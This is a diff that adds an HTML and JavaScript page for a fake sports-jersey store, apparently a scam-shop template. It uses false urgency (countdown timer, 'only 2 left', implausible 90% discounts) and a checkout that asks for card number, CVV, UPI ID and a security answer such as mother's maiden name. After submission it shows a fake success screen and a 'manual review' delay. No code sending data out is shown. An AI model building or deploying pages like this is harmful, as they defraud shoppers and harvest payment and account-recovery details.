@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UltraKick Deals | Premium Sports Store</title>
+    <style>
+        :root {
+            --primary-blue: #3b82f6;
+            --brand-red: #cc0000;
+            --brand-yellow: #ffcc00;
+            --brand-green: #22c55e;
+            --bg-gray: #f8fafc;
+            --text-dark: #1e293b;
+            --border-light: #e2e8f0;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--bg-gray);
+            color: var(--text-dark);
+            line-height: 1.5;
+            overflow-x: hidden;
+        }
+
+        /* --- Global Components --- */
+        .top-banner {
+            background: var(--brand-red);
+            color: white;
+            text-align: center;
+            padding: 10px;
+            font-size: 11px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+        }
+
+        header {
+            background: white;
+            padding: 15px 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border-light);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .logo {
+            font-size: 1.2rem;
+            font-weight: 900;
+            cursor: pointer;
+            color: #000;
+            display: flex;
+            align-items: center;
+        }
+
+        .logo span {
+            background: var(--brand-yellow);
+            padding: 2px 6px;
+            border-radius: 4px;
+            margin-left: 4px;
+        }
+
+        .cart-pill {
+            background: #f1f5f9;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-weight: 700;
+            font-size: 12px;
+        }
+
+        /* --- Store Front --- */
+        .hero {
+            background: white;
+            text-align: center;
+            padding: 40px 5%;
+            border-bottom: 1px solid var(--border-light);
+        }
+
+        .hero h1 { font-size: 1.8rem; margin-bottom: 10px; }
+
+        .timer-pill {
+            display: inline-block;
+            background: #fef2f2;
+            color: var(--brand-red);
+            padding: 8px 16px;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 13px;
+            border: 1px solid #fee2e2;
+            margin-top: 10px;
+        }
+
+        .product-container {
+            max-width: 1000px;
+            margin: 30px auto;
+            padding: 0 5%;
+        }
+
+        .product-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(230px, 1fr));
+            gap: 20px;
+        }
+
+        .product-card {
+            background: white;
+            border-radius: 12px;
+            padding: 15px;
+            border: 1px solid var(--border-light);
+            transition: transform 0.2s, box-shadow 0.2s;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .product-card:hover { 
+            transform: translateY(-4px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.05);
+        }
+
+        /* Image Placeholder Logic */
+        .product-img-wrapper {
+            width: 100%;
+            height: 220px;
+            background: #f1f5f9;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            overflow: hidden;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .product-img-wrapper img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .img-fallback {
+            color: #94a3b8;
+            font-size: 11px;
+            font-weight: 600;
+            text-align: center;
+            padding: 10px;
+        }
+
+        .price-row {
+            display: flex;
+            align-items: baseline;
+            gap: 8px;
+            margin: 8px 0;
+        }
+
+        .price-new { font-size: 20px; font-weight: 800; color: var(--brand-red); }
+        .price-old { text-decoration: line-through; color: #94a3b8; font-size: 13px; }
+
+        .btn-row { display: flex; gap: 8px; margin-top: auto; padding-top: 10px; }
+        .btn {
+            flex: 1;
+            padding: 10px;
+            border: none;
+            border-radius: 6px;
+            font-weight: 700;
+            font-size: 11px;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+        .btn-cart { background: #1e293b; color: white; }
+        .btn-buy { background: var(--brand-yellow); color: #000; }
+
+        /* --- Unified Responsive Checkout --- */
+        #checkout-page {
+            display: none;
+            max-width: 1100px;
+            margin: 20px auto;
+            padding: 0 5% 50px;
+        }
+
+        .checkout-layout {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px;
+            align-items: flex-start;
+        }
+
+        .checkout-col {
+            flex: 1;
+            min-width: 320px;
+            background: white;
+            padding: 25px;
+            border-radius: 12px;
+            border: 1px solid var(--border-light);
+            box-shadow: 0 4px 6px -1px rgba(0,0,0,0.03);
+        }
+
+        .col-title { font-size: 1.1rem; font-weight: 800; margin-bottom: 5px; }
+        .col-sub { font-size: 12px; color: #64748b; margin-bottom: 20px; }
+
+        .payment-tabs {
+            display: flex;
+            border-bottom: 1px solid var(--border-light);
+            margin-bottom: 20px;
+        }
+        .tab {
+            padding: 10px 20px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 700;
+            color: #64748b;
+            border-bottom: 2px solid transparent;
+        }
+        .tab.active {
+            color: var(--primary-blue);
+            border-bottom-color: var(--primary-blue);
+        }
+
+        .method-content { display: none; }
+        .method-content.active { display: block; }
+
+        .upi-container { text-align: center; padding: 10px 0; }
+        .qr-placeholder {
+            width: 160px;
+            height: 160px;
+            margin: 0 auto 15px;
+            background: white;
+            border: 1px solid #ddd;
+            padding: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .qr-placeholder svg { width: 100%; height: 100%; }
+        
+        .upi-apps {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+        .upi-app {
+            width: 45px;
+            height: 45px;
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 10px;
+            font-weight: 800;
+        }
+
+        .form-group { margin-bottom: 15px; }
+        .form-row { display: flex; gap: 12px; }
+        label { display: block; font-size: 11px; font-weight: 700; color: #475569; margin-bottom: 4px; }
+        input, select {
+            width: 100%;
+            padding: 11px;
+            border: 1px solid var(--border-light);
+            border-radius: 6px;
+            font-size: 14px;
+            outline: none;
+            background: #fff;
+        }
+        input:focus { border-color: var(--primary-blue); }
+
+        .card-visual {
+            background: linear-gradient(135deg, #1e293b 0%, #334155 100%);
+            border-radius: 10px;
+            padding: 20px;
+            color: white;
+            margin-bottom: 20px;
+            min-height: 120px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .suspicious-box {
+            background: #fffbeb;
+            border: 1px solid #fde68a;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 11px;
+            margin-bottom: 15px;
+            color: #92400e;
+            line-height: 1.4;
+        }
+
+        .verification-wrapper {
+            background: #f8fafc;
+            border: 1px dashed #cbd5e1;
+            padding: 15px;
+            border-radius: 8px;
+        }
+
+        .pay-btn-container {
+            width: 100%;
+            padding: 20px 0 40px;
+            text-align: center;
+        }
+
+        .pay-btn {
+            background: var(--primary-blue);
+            color: white;
+            width: 100%;
+            max-width: 400px;
+            padding: 16px;
+            border-radius: 50px;
+            border: none;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
+            transition: transform 0.2s;
+        }
+
+        /* --- Overlay Animations --- */
+        #overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(255,255,255,0.99);
+            z-index: 1000;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #f1f5f9;
+            border-top: 4px solid var(--primary-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        #success-tick {
+            display: none;
+            width: 80px;
+            height: 80px;
+            background: var(--brand-green);
+            border-radius: 50%;
+            align-items: center;
+            justify-content: center;
+            animation: pop 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        @keyframes pop { 0% { transform: scale(0); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
+
+        .tick-icon { width: 40px; height: 40px; fill: white; }
+
+        /* Held For Review Result */
+        .held-card {
+            max-width: 440px;
+            padding: 25px;
+            background: #fef2f2;
+            border: 1px solid #fee2e2;
+            border-radius: 12px;
+            margin-top: 20px;
+        }
+
+        .held-title { color: var(--brand-red); font-weight: 800; font-size: 22px; margin-bottom: 12px; }
+        
+        .pulse-dot {
+            height: 10px; width: 10px; background: red; border-radius: 50%;
+            display: inline-block; margin-right: 6px; animation: blink 1s infinite;
+        }
+
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+
+        .back-home {
+            background: #1e293b; color: white; border: none;
+            padding: 14px 35px; border-radius: 8px; font-weight: 700;
+            margin-top: 25px; cursor: pointer; font-size: 14px;
+        }
+
+        @media (max-width: 768px) {
+            .checkout-col { min-width: 100%; }
+            .form-row { flex-direction: column; gap: 0; }
+            .hero h1 { font-size: 1.4rem; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="top-banner">CLEARANCE ALERT: ALL PREMIUM JERSEYS AT ₹499 - ENDS SOON!</div>
+
+    <header>
+        <div class="logo" onclick="resetApp()">ULTRAKICK<span>DEALS</span></div>
+        <div class="cart-pill">CART: <span id="cart-count">0</span></div>
+    </header>
+
+    <!-- Main Store View -->
+    <div id="store-view">
+        <section class="hero">
+            <h1>Warehouse Liquidation</h1>
+            <p style="font-size: 14px; color: #64748b;">Limited stock directly from international distributors.</p>
+            <div class="timer-pill">OFFER EXPIRES IN: <span id="timer">09:59</span></div>
+        </section>
+
+        <div class="product-container">
+            <div class="product-grid" id="product-grid">
+                <!-- JS Inject Products -->
+            </div>
+        </div>
+    </div>
+
+    <!-- Responsive Checkout -->
+    <div id="checkout-page">
+        <div class="checkout-layout">
+            
+            <!-- Payment Column -->
+            <div class="checkout-col">
+                <h2 class="col-title">Bhugtan Karein (Payment)</h2>
+                <p class="col-sub">Select your preferred payment method</p>
+                
+                <div class="payment-tabs">
+                    <div class="tab active" onclick="switchTab('card')">Debit/Credit Card</div>
+                    <div class="tab" onclick="switchTab('upi')">UPI / QR Code</div>
+                </div>
+
+                <!-- Card Method -->
+                <div id="card-method" class="method-content active">
+                    <div class="card-visual">
+                        <div style="font-size: 16px; letter-spacing: 2px;">XXXX XXXX XXXX XXXX</div>
+                        <div style="display: flex; justify-content: space-between; font-size: 10px; opacity: 0.8;">
+                            <span>CARD HOLDER</span>
+                            <span>MM / YY</span>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>Card Number</label>
+                        <input type="text" placeholder="0000 0000 0000 0000" maxlength="19">
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group" style="flex: 2;">
+                            <label>Expiry Date</label>
+                            <input type="text" placeholder="MM / YY">
+                        </div>
+                        <div class="form-group" style="flex: 1;">
+                            <label>CVV</label>
+                            <input type="password" placeholder="***" maxlength="3">
+                        </div>
+                    </div>
+                </div>
+
+                <!-- UPI Method -->
+                <div id="upi-method" class="method-content">
+                    <div class="upi-container">
+                        <div class="qr-placeholder">
+                            <svg viewBox="0 0 100 100">
+                                <rect x="10" y="10" width="20" height="20" fill="black"/>
+                                <rect x="70" y="10" width="20" height="20" fill="black"/>
+                                <rect x="10" y="70" width="20" height="20" fill="black"/>
+                                <rect x="15" y="15" width="10" height="10" fill="white"/>
+                                <rect x="75" y="15" width="10" height="10" fill="white"/>
+                                <rect x="15" y="75" width="10" height="10" fill="white"/>
+                                <rect x="35" y="10" width="5" height="5" fill="black"/><rect x="45" y="20" width="5" height="5" fill="black"/>
+                                <rect x="35" y="30" width="10" height="5" fill="black"/><rect x="60" y="10" width="5" height="15" fill="black"/>
+                                <rect x="10" y="40" width="15" height="5" fill="black"/><rect x="30" y="45" width="20" height="10" fill="black"/>
+                                <rect x="60" y="40" width="10" height="10" fill="black"/><rect x="80" y="40" width="10" height="20" fill="black"/>
+                                <rect x="50" y="70" width="15" height="15" fill="black"/><rect x="75" y="75" width="10" height="10" fill="black"/>
+                            </svg>
+                        </div>
+                        <p style="font-size: 11px; font-weight: bold; margin-bottom: 10px;">Scan QR to Pay with any UPI App</p>
+                        <div class="upi-apps">
+                            <div class="upi-app" style="color:#673ab7">PPe</div>
+                            <div class="upi-app" style="color:#4285f4">GPay</div>
+                            <div class="upi-app" style="color:#00baf2">Paytm</div>
+                            <div class="upi-app" style="color:#ff5722">BHIM</div>
+                        </div>
+                        <div class="form-group">
+                            <label>Or Enter UPI ID / Mobile Number</label>
+                            <input type="text" id="vpa-field" placeholder="username@upi">
+                        </div>
+                    </div>
+                </div>
+
+                <div class="suspicious-box">
+                    <strong>Payment Verification Required:</strong> High volume traffic detected. Secondery identity validation is required to approve your 90% discount.
+                </div>
+
+                <div class="verification-wrapper">
+                    <label>Verification Answer (e.g. Mother's Maiden Name)</label>
+                    <input type="text" placeholder="Required for order approval">
+                    <p style="font-size: 10px; color: #94a3b8; margin-top: 5px;">* Information used for identity validation only.</p>
+                </div>
+            </div>
+
+            <!-- Shipping Column -->
+            <div class="checkout-col">
+                <h2 class="col-title">Personal information</h2>
+                <p class="col-sub">Delivery address and contact details</p>
+
+                <div class="form-row">
+                    <div class="form-group">
+                        <label>First name</label>
+                        <input type="text" id="cust-name" placeholder="John">
+                    </div>
+                    <div class="form-group">
+                        <label>Last name</label>
+                        <input type="text" placeholder="Doe">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Country</label>
+                    <select>
+                        <option>India</option>
+                        <option>United Kingdom</option>
+                        <option>United States</option>
+                    </select>
+                </div>
+
+                <div class="form-row">
+                    <div class="form-group" style="flex: 2;">
+                        <label>City</label>
+                        <input type="text" placeholder="New Delhi">
+                    </div>
+                    <div class="form-group" style="flex: 1;">
+                        <label>Zip code</label>
+                        <input type="text" placeholder="000000">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Email Address</label>
+                    <input type="email" placeholder="email@address.com">
+                </div>
+
+                <div class="form-group">
+                    <label>Phone Number</label>
+                    <input type="text" placeholder="+91 XXXXX XXXXX">
+                </div>
+            </div>
+
+        </div>
+
+        <div class="pay-btn-container">
+            <button class="pay-btn" onclick="startPaymentFlow()">AUTHORIZE ₹<span id="final-total">0</span> & PLACE ORDER</button>
+        </div>
+    </div>
+
+    <!-- Multi-Stage Responsive Overlay -->
+    <div id="overlay">
+        <div id="loader-view">
+            <div class="spinner" style="margin: 0 auto;"></div>
+            <h2 style="margin-top: 20px; font-weight: 800;">Authenticating...</h2>
+            <p style="color: #64748b; font-size: 14px;">Please do not refresh this page</p>
+        </div>
+
+        <div id="success-tick">
+            <svg class="tick-icon" viewBox="0 0 24 24">
+                <path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z" />
+            </svg>
+        </div>
+        <h2 id="success-text" style="display:none; color: var(--brand-green); margin-top: 15px; font-weight: 800;">Bhugtan Safal (Success!)</h2>
+
+        <div id="held-view" style="display:none;">
+            <div class="held-title">TRANSACTION PENDING</div>
+            <div class="held-card">
+                <p style="text-align: left; margin-bottom: 12px; font-weight: 700; color: #1e293b; font-size: 14px;">
+                    <span class="pulse-dot"></span> Manual Review Required
+                </p>
+                <p style="text-align: left; font-size: 13px; color: #475569; line-height: 1.6;">
+                    Transaction authorized. However, due to liquidation pricing policy, your order is held for <strong>Manual Security Review</strong> to verify eligibility.
+                </p>
+                <hr style="margin: 20px 0; border: 0; border-top: 1px solid #e2e8f0;">
+                <p style="text-align: left; font-size: 13px;">
+                    <strong>Tracking Ref:</strong> UKD-${Math.floor(Math.random()*900000 + 100000)}<br>
+                    <strong>Estimated Approval:</strong> 4 - 6 Hours
+                </p>
+            </div>
+            <button class="back-home" onclick="resetApp()">BACK TO HOME SCREEN</button>
+        </div>
+    </div>
+
+    <script>
+        /**
+         * PRODUCT DATA CONFIGURATION
+         * --------------------------
+         * Paste your local image paths or URLs in the 'imgSrc' field below.
+         * Example: imgSrc: "images/jersey1.png" OR imgSrc: "https://example.com/jersey.jpg"
+         */
+        const products = [
+            { 
+                id: 1, 
+                name: "Madrid Home Kit 24/25", 
+                price: 499, 
+                old: 3999,
+                imgSrc: "New folder/Real_Madrid_24-25_Home_Jersey_White_IU5011_HM30.avif" // <--- PASTE YOUR IMAGE PATH HERE
+            },
+            { 
+                id: 2, 
+                name: "Barcelona Home kit", 
+                price: 499, 
+                old: 3499,
+                imgSrc: "New folder/0b83e69c.jpg" // <--- PASTE YOUR IMAGE PATH HERE
+            },
+            { 
+                id: 3, 
+                name: "Bayern munich Home", 
+                price: 499, 
+                old: 3999,
+                imgSrc: "New folder/FC_Bayern_24-25_Home_Jersey_Red_IT8511_HM30.avif" // <--- PASTE YOUR IMAGE PATH HERE
+            },
+            { 
+                id: 4, 
+                name: "Ac Milan Home Kit", 
+                price: 499, 
+                old: 4999,
+                imgSrc: "New folder/25-Women's-Home-Jersey.avif" // <--- PASTE YOUR IMAGE PATH HERE
+            }
+        ];
+
+        let cart = [];
+        let activePaymentMethod = 'card';
+
+        function init() {
+            const grid = document.getElementById('product-grid');
+            grid.innerHTML = products.map(p => {
+                // If user hasn't provided an image, show a placeholder text
+                const imgTag = p.imgSrc 
+                    ? `<img src="${p.imgSrc}" alt="${p.name}" onerror="this.parentElement.innerHTML='<div class=\'img-fallback\'>Image Not Found</div>'">`
+                    : `<div class="img-fallback">Jersey Image [${p.id}]<br><small>(Paste path in JS code)</small></div>`;
+
+                return `
+                <div class="product-card">
+                    <div class="product-img-wrapper">
+                        ${imgTag}
+                    </div>
+                    <div style="font-size:10px; color:var(--brand-red); font-weight:bold; margin-bottom:5px">⚠️ ONLY 2 LEFT</div>
+                    <div class="p-title" style="font-weight:700">${p.name}</div>
+                    <div class="price-row">
+                        <span class="price-new">₹${p.price}</span>
+                        <span class="price-old">₹${p.old}</span>
+                    </div>
+                    <div class="btn-row">
+                        <button class="btn btn-cart" onclick="addToCart(${p.id})">Add</button>
+                        <button class="btn btn-buy" onclick="buyNow(${p.id})">Buy Now</button>
+                    </div>
+                </div>
+            `}).join('');
+            
+            let time = 599;
+            const timerDisplay = document.getElementById('timer');
+            setInterval(() => {
+                let m = Math.floor(time / 60);
+                let s = time % 60;
+                timerDisplay.innerText = `${m}:${s < 10 ? '0'+s : s}`;
+                if (time > 0) time--;
+            }, 1000);
+        }
+
+        function switchTab(method) {
+            activePaymentMethod = method;
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.method-content').forEach(c => c.classList.remove('active'));
+            
+            const target = event.currentTarget;
+            target.classList.add('active');
+            document.getElementById(method + '-method').classList.add('active');
+        }
+
+        function addToCart(id) {
+            const p = products.find(x => x.id === id);
+            cart.push(p);
+            updateCart();
+            alert(`${p.name} added to cart! Proceed to checkout before it's gone.`);
+        }
+
+        function buyNow(id) {
+            const p = products.find(x => x.id === id);
+            if (!cart.includes(p)) cart.push(p);
+            updateCart();
+            showCheckout();
+        }
+
+        function updateCart() {
+            document.getElementById('cart-count').innerText = cart.length;
+            const total = cart.reduce((s, i) => s + i.price, 0);
+            document.getElementById('final-total').innerText = total;
+        }
+
+        function showCheckout() {
+            if (cart.length === 0) return;
+            document.getElementById('store-view').style.display = 'none';
+            document.getElementById('checkout-page').style.display = 'block';
+            window.scrollTo(0, 0);
+        }
+
+        function startPaymentFlow() {
+            const name = document.getElementById('cust-name').value;
+            if (!name) return alert("Please complete all personal and contact information.");
+
+            document.getElementById('overlay').style.display = 'flex';
+
+            // Phase 1: Authentication Loader
+            setTimeout(() => {
+                document.getElementById('loader-view').style.display = 'none';
+                document.getElementById('success-tick').style.display = 'flex';
+                document.getElementById('success-text').style.display = 'block';
+
+                // Phase 2: Success Tick
+                setTimeout(() => {
+                    document.getElementById('success-tick').style.display = 'none';
+                    document.getElementById('success-text').style.display = 'none';
+                    document.getElementById('held-view').style.display = 'block';
+                }, 1800);
+
+            }, 2500);
+        }
+
+        function resetApp() {
+            cart = [];
+            updateCart();
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('held-view').style.display = 'none';
+            document.getElementById('loader-view').style.display = 'block';
+            document.getElementById('checkout-page').style.display = 'none';
+            document.getElementById('store-view').style.display = 'block';
+            window.scrollTo(0, 0);
+        }
+
+        init();
+    </script>
+</body>
+</html>
